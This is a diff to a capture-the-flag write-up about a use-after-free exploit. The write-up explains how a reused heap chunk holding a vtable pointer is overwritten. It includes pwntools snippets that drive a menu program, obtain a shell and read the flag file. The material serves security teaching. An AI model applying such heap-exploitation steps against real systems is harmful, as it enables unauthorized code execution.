@@ -40,13 +40,16 @@ p.sendline("3")
 print p.recv()
 p.sendline("2") 
 ```
-It's the ``w`` heap chunk containing vtable that is going to be reused the first time. So we have to store the payload twice, since ``m->introduce`` is called before ``w->introduce``
+It's the ``w`` heap chunk containing vtable that is going to be reused the first time. So we have to store the payload twice, since ``m->introduce`` is called before ``w->introduce``.
 ```python
 print p.recv()
 p.sendline("2")
 print p.recv()
 p.sendline("1")
 print p.recv()
+```
+We got the shell.
+```python
 p.sendline("cat flag")
 print p.recv()
 ```
